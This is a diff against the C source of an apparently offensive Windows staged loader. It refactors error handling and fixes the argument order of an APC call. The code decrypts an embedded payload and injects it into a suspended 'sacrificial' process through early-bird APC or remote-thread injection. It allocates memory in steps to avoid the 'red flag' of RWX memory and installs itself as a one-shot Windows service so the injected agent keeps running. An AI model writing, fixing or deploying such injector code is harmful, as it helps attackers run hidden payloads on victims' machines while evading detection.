@@ -275,7 +275,10 @@ static BOOL inj_queue_apc(HANDLE hthread, void *routine) {
     return ntsys_queue_apc(hthread, routine);
   }
 #endif
-  return QueueUserAPC(hthread, (PAPCFUNC)(ULONG_PTR)routine, 0) != 0;
+  /* QueueUserAPC(pfnAPC, hThread, dwData): do not swap the first two
+   * arguments, or the routine pointer is treated as a handle and the call
+   * fails with ERROR_INVALID_HANDLE. */
+  return QueueUserAPC((PAPCFUNC)(ULONG_PTR)routine, hthread, 0) != 0;
 }
 
 static HANDLE inj_create_thread(HANDLE hproc, void *routine) {
@@ -410,6 +413,17 @@ static void kill_child_cleanup(PROCESS_INFORMATION *pi) {
   CloseHandle(pi->hProcess);
 }
 
+/* inject_fail releases an optional remote region and tears down the suspended
+ * child, preserving the original error. Centralizing it keeps the injection
+ * steps below straight-line (no cleanup gotos). */
+static DWORD inject_fail(PROCESS_INFORMATION *pi, void *base, DWORD err) {
+  if (base != NULL) {
+    VirtualFreeEx(pi->hProcess, base, 0, MEM_RELEASE);
+  }
+  kill_child_cleanup(pi);
+  return err;
+}
+
 /*
  * do_inject_apc spawns the sacrificial process suspended and early-bird
  * injects the decrypted blob (QueueUserAPC). Returns NO_ERROR on success, or
@@ -433,16 +447,14 @@ static DWORD do_inject_apc(const unsigned char *payload, size_t payload_len) {
   sleep_fn = GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "Sleep");
   if (sleep_fn == NULL) {
     LOG(L"cannot resolve kernel32!Sleep");
-    err = ERROR_PROC_NOT_FOUND;
-    goto fail_create;
+    return inject_fail(&pi, base, ERROR_PROC_NOT_FOUND);
   }
 
   tramp_len = build_trampoline(tramp, 0, 0, 0); /* size probe */
   blob_off = (tramp_len + 0xF) & ~(size_t)0xF;
   if (payload_len > (SIZE_T)-1 - blob_off) {
     LOG(L"payload too large");
-    err = ERROR_BAD_LENGTH;
-    goto fail_create;
+    return inject_fail(&pi, base, ERROR_BAD_LENGTH);
   }
   total = blob_off + payload_len;
 
@@ -450,35 +462,40 @@ static DWORD do_inject_apc(const unsigned char *payload, size_t payload_len) {
    * obvious red flag, and the payload only needs to be executable once it
    * runs (the trampoline and blob are not self-modifying). */
   if (!inj_alloc_rw(pi.hProcess, total, &base)) {
-    LOG(L"region allocation failed: %lu", GetLastError());
     err = GetLastError();
-    goto fail_create;
+    LOG(L"region allocation failed: %lu", err);
+    return inject_fail(&pi, base, err);
   }
 
   blob_addr = base + blob_off;
   if (!inj_write(pi.hProcess, blob_addr, payload, payload_len)) {
-    LOG(L"payload write failed: %lu", GetLastError());
-    goto fail;
+    err = GetLastError();
+    LOG(L"payload write failed: %lu", err);
+    return inject_fail(&pi, base, err);
   }
   tramp_len = build_trampoline(tramp, (uintptr_t)base, (uintptr_t)blob_addr,
                                (uintptr_t)sleep_fn);
   if (!inj_write(pi.hProcess, base, tramp, tramp_len)) {
-    LOG(L"trampoline write failed: %lu", GetLastError());
-    goto fail;
+    err = GetLastError();
+    LOG(L"trampoline write failed: %lu", err);
+    return inject_fail(&pi, base, err);
   }
   if (!inj_protect_rx(pi.hProcess, base, total)) {
-    LOG(L"protect RX failed: %lu", GetLastError());
-    goto fail;
+    err = GetLastError();
+    LOG(L"protect RX failed: %lu", err);
+    return inject_fail(&pi, base, err);
   }
 
   /* Early bird: run the blob as the child's first user-mode APC. */
   if (!inj_queue_apc(pi.hThread, base)) {
-    LOG(L"APC queue failed: %lu", GetLastError());
-    goto fail;
+    err = GetLastError();
+    LOG(L"APC queue failed: %lu", err);
+    return inject_fail(&pi, base, err);
   }
   if (ResumeThread(pi.hThread) == (DWORD)-1) {
-    LOG(L"ResumeThread failed: %lu", GetLastError());
-    goto fail;
+    err = GetLastError();
+    LOG(L"ResumeThread failed: %lu", err);
+    return inject_fail(&pi, base, err);
   }
   /* From here on the child runs on its own; the thread handle is no longer
    * needed and must not be closed again by the cleanup paths below. */
@@ -486,15 +503,6 @@ static DWORD do_inject_apc(const unsigned char *payload, size_t payload_len) {
   pi.hThread = NULL;
 
   return verify_child(&pi);
-
-fail:
-  kill_child_cleanup(&pi);
-  VirtualFreeEx(pi.hProcess, base, 0, MEM_RELEASE);
-  return GetLastError();
-fail_create:
-  /* The process handle exists but no remote allocation was made yet. */
-  kill_child_cleanup(&pi);
-  return err;
 }
 
 /*
@@ -518,42 +526,38 @@ static DWORD do_inject_ct(const unsigned char *payload, size_t payload_len) {
   }
 
   if (!inj_alloc_rw(pi.hProcess, payload_len, &base)) {
-    LOG(L"region allocation failed: %lu", GetLastError());
     err = GetLastError();
-    goto fail_create;
+    LOG(L"region allocation failed: %lu", err);
+    return inject_fail(&pi, base, err);
   }
   if (!inj_write(pi.hProcess, base, payload, payload_len)) {
-    LOG(L"payload write failed: %lu", GetLastError());
-    goto fail;
+    err = GetLastError();
+    LOG(L"payload write failed: %lu", err);
+    return inject_fail(&pi, base, err);
   }
   if (!inj_protect_rx(pi.hProcess, base, payload_len)) {
-    LOG(L"protect RX failed: %lu", GetLastError());
-    goto fail;
+    err = GetLastError();
+    LOG(L"protect RX failed: %lu", err);
+    return inject_fail(&pi, base, err);
   }
 
   remote = inj_create_thread(pi.hProcess, base);
   if (remote == NULL) {
-    LOG(L"remote thread creation failed: %lu", GetLastError());
-    goto fail;
+    err = GetLastError();
+    LOG(L"remote thread creation failed: %lu", err);
+    return inject_fail(&pi, base, err);
   }
   CloseHandle(remote);
 
   if (ResumeThread(pi.hThread) == (DWORD)-1) {
-    LOG(L"ResumeThread failed: %lu", GetLastError());
-    goto fail;
+    err = GetLastError();
+    LOG(L"ResumeThread failed: %lu", err);
+    return inject_fail(&pi, base, err);
   }
   CloseHandle(pi.hThread);
   pi.hThread = NULL;
 
   return verify_child(&pi);
-
-fail:
-  kill_child_cleanup(&pi);
-  VirtualFreeEx(pi.hProcess, base, 0, MEM_RELEASE);
-  return GetLastError();
-fail_create:
-  kill_child_cleanup(&pi);
-  return err;
 }
 
 /* do_inject dispatches to the build-time selected injection flavor. */
@@ -656,13 +660,12 @@ static VOID WINAPI service_main(DWORD argc, LPWSTR *argv) {
 
   if (decrypt_payload(&payload, &payload_len) != 0) {
     err = ERROR_RESOURCE_DATA_NOT_FOUND;
-    goto out;
+  } else {
+    report_status(SERVICE_RUNNING, NO_ERROR, 0, 0);
+    err = do_inject(payload, payload_len);
+    free(payload);
   }
-  report_status(SERVICE_RUNNING, NO_ERROR, 0, 0);
-  err = do_inject(payload, payload_len);
-  free(payload);
 
-out:
   /* One-shot: report stopped and exit. The sacrificial process keeps the
    * agent running on its own after we are gone. */
   report_status(SERVICE_STOPPED, err, 0, 0);
@@ -674,11 +677,21 @@ out:
 
 /* ------------------------------------------------------------- install CLI */
 
+/* close_service_handles releases either handle if it was opened; keeps the
+ * early-return paths below free of duplicated cleanup. */
+static void close_service_handles(SC_HANDLE scm, SC_HANDLE svc) {
+  if (svc != NULL) {
+    CloseServiceHandle(svc);
+  }
+  if (scm != NULL) {
+    CloseServiceHandle(scm);
+  }
+}
+
 static int service_install(void) {
-  SC_HANDLE scm = NULL;
-  SC_HANDLE svc = NULL;
+  SC_HANDLE scm;
+  SC_HANDLE svc;
   wchar_t image[MAX_PATH];
-  int ret = 1;
 
   if (GetModuleFileNameW(NULL, image, MAX_PATH) == 0) {
     LOG(L"GetModuleFileNameW failed: %lu", GetLastError());
@@ -696,30 +709,22 @@ static int service_install(void) {
                      SERVICE_ERROR_NORMAL, image, NULL, NULL, NULL, NULL, NULL);
   if (svc == NULL) {
     LOG(L"CreateServiceW failed: %lu", GetLastError());
-    goto out;
+    close_service_handles(scm, svc);
+    return 1;
   }
   LOG(L"service '%s' installed (%s)", g_service_name, image);
 #ifdef DEBUG
   wprint(L"start it with: sc start %s\n", g_service_name);
 #endif
-  ret = 0;
-
-out:
-  if (svc != NULL) {
-    CloseServiceHandle(svc);
-  }
-  if (scm != NULL) {
-    CloseServiceHandle(scm);
-  }
-  return ret;
+  close_service_handles(scm, svc);
+  return 0;
 }
 
 static int service_uninstall(void) {
-  SC_HANDLE scm = NULL;
-  SC_HANDLE svc = NULL;
+  SC_HANDLE scm;
+  SC_HANDLE svc;
   SERVICE_STATUS ss;
   int i;
-  int ret = 1;
 
   scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
   if (scm == NULL) {
@@ -729,7 +734,8 @@ static int service_uninstall(void) {
   svc = OpenServiceW(scm, g_service_name, SERVICE_ALL_ACCESS);
   if (svc == NULL) {
     LOG(L"OpenServiceW failed: %lu", GetLastError());
-    goto out;
+    close_service_handles(scm, svc);
+    return 1;
   }
   if (ControlService(svc, SERVICE_CONTROL_STOP, &ss)) {
     LOG(L"service stopped");
@@ -747,26 +753,18 @@ static int service_uninstall(void) {
   }
   if (!DeleteService(svc)) {
     LOG(L"DeleteService failed: %lu", GetLastError());
-    goto out;
+    close_service_handles(scm, svc);
+    return 1;
   }
   LOG(L"service '%s' removed", g_service_name);
-  ret = 0;
-
-out:
-  if (svc != NULL) {
-    CloseServiceHandle(svc);
-  }
-  if (scm != NULL) {
-    CloseServiceHandle(scm);
-  }
-  return ret;
+  close_service_handles(scm, svc);
+  return 0;
 }
 
 static int service_start_stop(int start) {
-  SC_HANDLE scm = NULL;
-  SC_HANDLE svc = NULL;
+  SC_HANDLE scm;
+  SC_HANDLE svc;
   SERVICE_STATUS ss;
-  int ret = 1;
 
   scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
   if (scm == NULL) {
@@ -776,32 +774,27 @@ static int service_start_stop(int start) {
   svc = OpenServiceW(scm, g_service_name, SERVICE_START | SERVICE_STOP);
   if (svc == NULL) {
     LOG(L"OpenServiceW failed: %lu", GetLastError());
-    goto out;
+    close_service_handles(scm, svc);
+    return 1;
   }
   if (start) {
     if (!StartServiceW(svc, 0, NULL)) {
       LOG(L"StartServiceW failed: %lu", GetLastError());
-      goto out;
+      close_service_handles(scm, svc);
+      return 1;
     }
     LOG(L"service '%s' started (one-shot: it stops after injection)",
         g_service_name);
   } else {
     if (!ControlService(svc, SERVICE_CONTROL_STOP, &ss)) {
       LOG(L"ControlService failed: %lu", GetLastError());
-      goto out;
+      close_service_handles(scm, svc);
+      return 1;
     }
     LOG(L"service '%s' stop requested", g_service_name);
   }
-  ret = 0;
-
-out:
-  if (svc != NULL) {
-    CloseServiceHandle(svc);
-  }
-  if (scm != NULL) {
-    CloseServiceHandle(scm);
-  }
-  return ret;
+  close_service_handles(scm, svc);
+  return 0;
 }
 
 #endif /* STAGED_LOADER_NO_SERVICE */
